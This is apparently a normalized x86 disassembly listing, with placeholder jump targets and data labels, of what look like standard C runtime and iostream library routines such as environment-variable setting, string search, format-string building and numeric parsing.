push [ ebp - 0x4 ]
call sub_10027a85
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
push esi
push esi
call sub_10027160
inc eax
pop ecx
inc eax
push eax
push edi
call sub_1002e87c
add esp 0xc
test eax eax
je r-xdata
mov [ rw-data ] eax
mov ecx [ ebp - 0x8 ]
mov eax edi
sub eax esi
add eax [ ebp - 0x14 ]
mov [ eax ] bl
inc eax
neg ecx
sbb ecx ecx
not ecx
and ecx eax
push ecx
push edi
call [ SetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100276d9
add esp 0x14
push edi
call sub_10027a85
pop ecx
or [ ebp - 0xc ] 0xffffffff
call sub_1002d4db
mov [ eax ] 0x2a
sub_1003ec37
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
push edi
push [ ebp + 0x8 ]
call sub_10027160
mov esi eax
inc esi
push esi
call sub_1002a4a4
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
push [ ebp + 0x8 ]
push esi
push edi
call sub_1002e87c
add esp 0xc
test eax eax
je r-xdata
pop ebx
pop ebp
retn
mov eax edi
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100276d9
add esp 0x14
pop edi
pop esi
sub_1003ec8c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ ebp - 0xc ]
cmp [ esi + 0x8 ] ebx
jne r-xdata
call sub_1002d4db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ eax ]
movzx ecx cx
cmp cx bx
jne r-xdata
push [ ebp + 0xc ]
push eax
call sub_1003ed70
pop ecx
pop ecx
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx cl
test [ edx + esi + 0x1d ] 0x4
je r-xdata
movzx ecx cx
cmp [ ebp + 0xc ] ecx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
movzx edx cx
cmp [ ebp + 0xc ] edx
je r-xdata
inc eax
mov dl [ eax ]
cmp dl bl
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc eax
movzx ecx cx
movzx edx dl
shl ecx 0x8
or ecx edx
cmp [ ebp + 0xc ] ecx
jne r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
dec eax
jmp r-xdata
sub_1003ed70
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_1003ee46
push 0x10
mov eax sub_1004eb14
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_10021e84
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0xc ] ebx
ja r-xdata
mov ecx [ ebp + 0xc ]
call sub_10007d44
mov eax [ esi + 0x8 ]
mov edi ebx
shl edi 0x2
add eax edi
cmp [ eax ] 0x0
je r-xdata
lea edi [ ebx + 0x1 ]
cmp edi 0x28
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
or [ ebp - 0x4 ] 0xffffffff
mov [ edi + eax ] ecx
lea ecx [ ebp - 0x10 ]
call sub_10021eac
call sub_1002b37e
retn
mov ecx [ eax ]
call sub_10007d82
test eax eax
je r-xdata
mov eax edi
shl eax 0x2
push eax
push [ esi + 0x8 ]
call sub_1002de41
pop ecx
pop ecx
test eax eax
jne r-xdata
push 0x28
pop edi
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
mov [ esi + 0x8 ] eax
jmp r-xdata
test [ rw-data ] 0x1
mov esi rw-data
jne r-xdata
cmp [ esi + 0xc ] edi
jb r-xdata
push esi
lea ecx [ ebp - 0x1c ]
call sub_10002381
push r--data
lea eax [ ebp - 0x1c ]
push eax
call sub_1002ae74
or [ rw-data ] 0x1
mov ecx esi
call sub_10027370
push sub_10053846
call sub_1002c1a3
pop ecx
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x8 ]
and [ ecx + eax * 4 ] 0x0
inc [ esi + 0xc ]
sub_1003ef24
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1004173c
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003ef47
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1004173c
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003ef6a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x14 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test bl 0x20
je r-xdata
test bl 0x10
je r-xdata
mov [ ecx ] 0x2b
inc ecx
mov dl [ ebp + 0x10 ]
mov [ ecx ] 0x2e
inc ecx
mov [ ecx ] 0x2a
inc ecx
test dl dl
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov edx 0x3000
and ebx edx
cmp ebx 0x2000
jne r-xdata
mov [ ecx ] dl
inc ecx
cmp ebx edx
jne r-xdata
mov dl 0x66
jmp r-xdata
cmp ebx 0x1000
setne dl
lea edx [ edx + edx + 0x65 ]
mov dl 0x61
jmp r-xdata
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
sub_1003efd1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test dl 0x20
je r-xdata
test dl 0x8
je r-xdata
mov [ ecx ] 0x2b
inc ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov bl [ edi ]
cmp bl 0x4c
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov [ ecx ] 0x49
inc ecx
mov [ ecx ] 0x36
inc ecx
mov [ ecx ] 0x34
mov [ ecx ] bl
jmp r-xdata
cmp esi 0x800
je r-xdata
mov dl 0x6f
jmp r-xdata
mov esi edx
and esi 0xe00
inc ecx
cmp esi 0x400
jne r-xdata
shl dl 0x3
not dl
and dl 0x20
or dl 0x58
mov dl [ edi + 0x1 ]
jmp r-xdata
pop edi
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
sub_1003f048
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ esi ] 0x1
push [ ebp + 0x8 ]
call sub_1000f140
cmp eax 0xffffffff
jne r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1003f06e
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
pop esi
retn
call sub_1000d047
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x4 ] 0x0
pop esi
retn
sub_1003f092
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
call sub_1000d074
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x5 ] al
jmp r-xdata
mov al [ esi + 0x5 ]
mov [ esi + 0x4 ] 0x1
pop esi
retn
sub_1003f0b8
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
cmp [ edi + 0x4 ] bl
jne r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] bl
jne r-xdata
call sub_1003f092
cmp [ edi ] ebx
jne r-xdata
mov ecx esi
call sub_1003f092
cmp [ esi ] ebx
je r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_1003f0f7
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
movzx eax [ esi ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_1003f048
dec [ ebp + 0x1c ]
inc esi
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop esi
sub_1003f12d
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x18 ]
lea ecx [ ebp + 0x10 ]
call sub_1003f048
dec [ ebp + 0x1c ]
jne r-xdata
sub_1003f158
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0x18 ]
mov esi ebx
sub eax edi
mov esi eax
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
leave
retn
cmp [ ebp + 0x20 ] 0x0
je r-xdata
push esi
push edi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_1003f0f7
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x18
add edi esi
sub ebx esi
mov [ ebp + 0x14 ] ecx
je r-xdata
inc edi
dec ebx
jmp r-xdata
push 0x1
push [ ebp + 0x20 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_1003f12d
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x14 ] eax
push ebx
push 0x0
push edi
call sub_10027b60
add esp 0xc
test eax eax
je r-xdata
sub_1003f234
push 0x38
mov eax sub_1004eb37
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x44 ] eax
mov al [ edi ]
test al al
je r-xdata
push 0x0
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x2c ]
call sub_10005cd0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x40 ] 0xfffffffe
mov [ ebp - 0x38 ] 0x1
mov cl al
mov edx edi
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
mov eax [ ebp - 0x40 ]
call sub_1002b392
retn
mov al [ esi + edi ]
test al al
je r-xdata
inc edx
mov cl [ edx ]
test cl cl
jne r-xdata
inc [ ebp + 0x10 ]
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005d90
cmp [ eax ] 0x0
je r-xdata
mov cl [ edi ]
cmp cl al
jne r-xdata
add esi [ ebp - 0x38 ]
mov al [ esi + edi ]
cmp al [ edi ]
je r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005d90
movsx eax [ eax ]
add esi eax
jmp r-xdata
inc esi
mov al [ esi + edi ]
test al al
jne r-xdata
push 0x7f
pop ebx
cmp [ ebp - 0x38 ] ebx
jae r-xdata
test al al
je r-xdata
inc [ ebp - 0x34 ]
mov eax [ ebp - 0x34 ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp al cl
je r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005d90
mov [ eax ] bl
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x40 ] eax
mov ebx [ ebp - 0x38 ]
push [ ebp - 0x44 ]
mov ecx [ ebp - 0x3c ]
call sub_1003f0b8
test al al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
push 0x7f
pop ebx
cmp [ ebp - 0x38 ] ebx
jae r-xdata
mov ecx [ ebp - 0x3c ]
call sub_1003f1eb
cmp [ esi + edi ] al
jne r-xdata
push [ ebp - 0x44 ]
mov ecx [ ebp - 0x3c ]
call sub_1003f0b8
test al al
jne r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005d90
mov [ eax ] bl
jmp r-xdata
mov ebx [ ebp - 0x38 ]
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x3c ]
inc [ ebp - 0x38 ]
call sub_1003f06e
or [ ebp - 0x40 ] 0xffffffff
jmp r-xdata
xor esi esi
mov [ ebp - 0x2d ] 0x0
mov [ ebp - 0x34 ] esi
cmp [ ebp + 0x10 ] esi
jbe r-xdata
sub_1003f3a1
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x4
pop eax
call sub_1002b37e
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100078da
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003ef24
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_1003f440
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x4
pop eax
call sub_1002b37e
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100078da
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003ef47
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_1003f4df
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003f3a1
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_1003f57c
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003f440
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_1003f619
push 0x20
mov eax sub_1004eb6e
call sub_1002b2a6
mov eax [ ebp + 0xc ]
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x10 ]
and eax 0x2
mov [ ebp - 0x10 ] eax
je r-xdata
mov eax [ ebp + 0xc ]
and eax 0x8
mov [ ebp + 0x10 ] eax
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_1000cfaa
pop ecx
push eax
push 0x18
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
cmp [ ebp - 0x10 ] edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_1003f4df
pop ecx
push eax
push 0x10
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
xor ebx ebx
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1000ceea
mov ebx eax
jmp r-xdata
push [ ebp + 0x14 ]
mov ebx [ ebp + 0x8 ]
push esi
push [ ebp + 0xc ]
push ebx
call sub_1004dac0
push [ ebp + 0x14 ]
push esi
push [ ebp + 0xc ]
push ebx
call sub_1004a8cb
push [ ebp + 0x14 ]
push esi
push [ ebp + 0xc ]
push ebx
call sub_1004ad5c
mov eax [ ebp + 0xc ]
or [ esi + 0x10 ] eax
add esp 0x30
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1003f384
push eax
lea ecx [ esi + 0x18 ]
mov [ ebp - 0x4 ] 0x12
call sub_10003855
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
mov eax esi
call sub_1002b37e
retn
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_1003f57c
pop ecx
push eax
push 0x10
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
xor ebx ebx
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003ef24
mov ebx eax
jmp r-xdata
mov ecx esi
call sub_100247b0
mov ecx rw-data
call sub_10007573
push eax
push ebx
jmp r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_1000ef88
pop ecx
push eax
push 0x8
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor ebx ebx
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003ef47
mov ebx eax
jmp r-xdata
mov ecx esi
call sub_100247b0
mov ecx rw-data
call sub_10007573
push eax
push ebx
jmp r-xdata
xor ebx ebx
mov [ eax + 0x4 ] edi
mov [ eax ] r--data
mov ebx eax
jmp r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_10016973
pop ecx
push eax
push 0x18
call sub_1002738b
pop ecx
mov ecx eax
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] 0xe
cmp ecx edi
je r-xdata
mov ecx esi
call sub_100247b0
cmp [ ebp + 0x10 ] edi
je r-xdata
mov ecx rw-data
call sub_10007573
push eax
push ebx
jmp r-xdata
mov ecx esi
call sub_100247b0
mov ecx rw-data
call sub_10007573
push eax
push ebx
jmp r-xdata
xor ebx ebx
push edi
push edi
push [ ebp + 0x8 ]
call sub_1001689a
mov ebx eax
jmp r-xdata
mov ecx esi
call sub_100247b0
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007573
push eax
push ebx
jmp r-xdata
sub_1003f840
push 0x88
mov eax sub_1004eb9f
call sub_1002b30f
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp ebx [ rw-data ]
jne r-xdata
push 0x0
lea ecx [ ebp - 0x88 ]
call sub_10021e84
mov eax [ esi + 0xc ]
xor edi edi
inc edi
mov [ ebp - 0x4 ] edi
test eax eax
jbe r-xdata
push r--data
lea ecx [ ebp - 0x84 ]
call sub_100255c0
and [ ebp - 0x4 ] 0x0
push 0x0
push esi
lea eax [ ebp - 0x84 ]
push 0x3f
push eax
call sub_1003f619
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x84 ]
call sub_1000794c
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x88 ]
call sub_10021eac
shl eax 0x2
push eax
call sub_1002ddb0
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
jne r-xdata
call sub_1002b392
retn
mov edi [ esi + 0xc ]
jmp r-xdata
test [ rw-data ] 0x1
mov esi rw-data
jne r-xdata
test edi edi
ja r-xdata
push esi
lea ecx [ ebp - 0x94 ]
call sub_10002381
push r--data
lea eax [ ebp - 0x94 ]
push eax
call sub_1002ae74
or [ rw-data ] edi
mov ecx esi
call sub_10027370
push sub_10053832
call sub_1002c1a3
pop ecx
mov eax [ ebx + 0x8 ]
dec edi
mov ecx [ eax + edi * 4 ]
mov eax [ esi + 0x8 ]
mov [ eax + edi * 4 ] ecx
test ecx ecx
je r-xdata
call sub_10007d44
sub_1003f93b
push 0x50
mov eax sub_1004ebe7
call sub_1002b30f
mov esi [ ebp + 0x14 ]
test [ esi + 0x10 ] 0x4000
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] edi
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx esi
call sub_10007dd5
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_10016973
pop ecx
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x38 ] eax
call sub_10007dbd
lea ecx [ ebp - 0x2c ]
call sub_100082a7
mov ecx [ ebp - 0x38 ]
xor edi edi
inc edi
lea eax [ ebp - 0x5c ]
mov [ ebp - 0x4 ] edi
push eax
cmp [ ebp + 0x1c ] bl
je r-xdata
movzx edx [ ebp + 0x1c ]
mov eax [ ecx ]
push edx
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call [ eax + 0x1c ]
mov eax edi
jmp r-xdata
call sub_1003f21b
mov [ ebp - 0x4 ] 0x3
call sub_10043240
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
call sub_1002b392
retn 0x18
xor edi edi
cmp eax [ ebp - 0x18 ]
jbe r-xdata
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x2c ]
call sub_100021c3
push ebx
push edi
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x1
call sub_100020e2
mov eax [ esi + 0x18 ]
cmp eax ebx
jle r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
push edi
push [ ebp + 0x18 ]
lea eax [ ebp - 0x40 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x30 ]
call sub_1003f12d
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
xor edi edi
sub eax [ ebp - 0x18 ]
mov edi eax
jmp r-xdata
push [ ebp - 0x18 ]
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x40 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x30 ]
call sub_1003f0f7
mov ecx [ eax ]
push edi
push [ ebp + 0x18 ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x34 ]
mov [ ebp + 0x10 ] eax
push [ ebp - 0x30 ]
mov [ esi + 0x18 ] ebx
call sub_1003f12d
add esp 0x30
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
mov eax [ ebp - 0x34 ]
lea eax [ ebp - 0x28 ]
mov eax [ esi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
sub_1003fa84
push 0x58
mov eax sub_1004ec1c
call sub_1002b30f
mov eax [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
push eax
mov [ ebp - 0x60 ] ebx
call sub_10016973
mov esi eax
pop ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx esi
call sub_10005f61
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x8 ]
mov [ ebp - 0x4a ] al
mov [ ebp - 0x4a ] 0x0
jmp r-xdata
mov eax [ ebp + 0x18 ]
push 0x8
pop ebx
and eax 0xe00
push 0xa
pop esi
cmp eax 0x400
jne r-xdata
mov ecx edi
call sub_1003f1eb
mov ecx edi
cmp al 0x2b
jne r-xdata
push [ ebp - 0x5c ]
mov ecx edi
mov [ ebp - 0x50 ] ebx
call sub_1003f0b8
test al al
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x54 ] ebx
jmp r-xdata
call sub_1003f1eb
cmp al 0x2d
jne r-xdata
mov [ ebx ] al
jmp r-xdata
neg eax
sbb eax eax
and eax esi
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x54 ] 0x10
jmp r-xdata
push [ ebp - 0x5c ]
mov [ ebp - 0x58 ] 0x0
push edi
mov [ ebp - 0x49 ] 0x0
call sub_1003f200
pop ecx
pop ecx
test al al
je r-xdata
mov [ ebx ] al
mov ecx edi
inc ebx
mov [ ebp - 0x50 ] ebx
call sub_1003f06e
cmp [ ebp - 0x54 ] 0x0
je r-xdata
mov ecx edi
call sub_1003f1eb
cmp al 0x30
jne r-xdata
mov [ ebp - 0x64 ] esi
cmp [ ebp - 0x54 ] esi
je r-xdata
mov ecx edi
mov [ ebp - 0x58 ] 0x1
call sub_1003f06e
push [ ebp - 0x5c ]
push edi
call sub_1003f200
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x30 ] 0x10
mov esi [ ebp - 0x44 ]
jae r-xdata
mov ecx edi
call sub_1003f1eb
mov ecx [ ebp - 0x50 ]
push [ ebp - 0x64 ]
mov [ ecx ] al
movsx eax al
push eax
push r--data
call sub_10027b60
add esp 0xc
test eax eax
je r-xdata
xor eax eax
cmp [ ebp - 0x54 ] ebx
setne al
dec eax
and eax 0xfffffff2
add eax 0x16
mov [ ebp - 0x64 ] eax
jmp r-xdata
